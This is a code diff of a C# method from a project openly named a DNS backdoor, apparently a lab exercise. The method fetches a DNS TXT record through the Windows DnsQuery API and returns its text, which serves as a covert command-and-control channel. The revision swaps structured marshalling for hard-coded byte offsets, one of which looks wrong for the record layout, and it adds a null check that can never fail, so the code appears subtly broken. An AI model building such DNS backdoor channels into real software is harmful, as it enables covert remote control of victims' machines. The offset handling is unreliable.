@@ -121,34 +121,36 @@ namespace A06_6_DNS_Backdoor
         {
             IntPtr pResultList = IntPtr.Zero;
 
+            // Call the native Windows DNS utility
             int status = DnsQuery(domain, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, IntPtr.Zero, out pResultList, IntPtr.Zero);
 
-            // Status 0 indicates SUCCESS
             if (status == 0 && pResultList != IntPtr.Zero)
             {
-                object? unmanagedStruct = Marshal.PtrToStructure(pResultList, typeof(DNS_RECORD));
-                if (unmanagedStruct is DNS_RECORD record)
+                // Read the wType field located exactly 16 bytes into the record structure to confirm it is a TXT record (0x0010)
+                ushort recordType = (ushort)Marshal.ReadInt16(pResultList, 16);
+
+                if (recordType == DNS_TYPE_TEXT)
                 {
-                    if (record.wType == DNS_TYPE_TEXT && record.Data.dwStringCount > 0)
+                    // Bypass layout constraints: Read the string pointer array address by applying an explicit 52-byte offset
+                    IntPtr pStringArrayBase = IntPtr.Add(pResultList, 52);
+
+                    if (pStringArrayBase != IntPtr.Zero)
                     {
-                        // Safely evaluate the layout context before extracting string blocks
-                        if (record.Data.pStringArray != IntPtr.Zero)
+                        // Dereference the array pointer to find the location of our raw ANSI string characters
+                        IntPtr pActualStringBytes = Marshal.ReadIntPtr(pStringArrayBase);
+
+                        if (pActualStringBytes != IntPtr.Zero)
                         {
-                            // In a 64-bit environment, the structure array points to an entry containing the string data address
-                            IntPtr pStringString = Marshal.ReadIntPtr(record.Data.pStringArray);
+                            // Convert the raw address space into a managed C# string instance
+                            string? txtResult = Marshal.PtrToStringAnsi(pActualStringBytes);
 
-                            if (pStringString != IntPtr.Zero)
-                            {
-                                // The string returned by dnsapi.dll TXT records is parsed as Ansi/UTF-8 array format natively,
-                                // rather than Unicode wide-characters.
-                                string? txtResult = Marshal.PtrToStringAnsi(pStringString);
-
-                                DnsRecordListFree(pResultList, 0);
-                                return txtResult;
-                            }
+                            // Clean up unmanaged allocations completely
+                            DnsRecordListFree(pResultList, 0);
+                            return txtResult;
                         }
                     }
                 }
+
                 DnsRecordListFree(pResultList, 0);
             }
             return null;
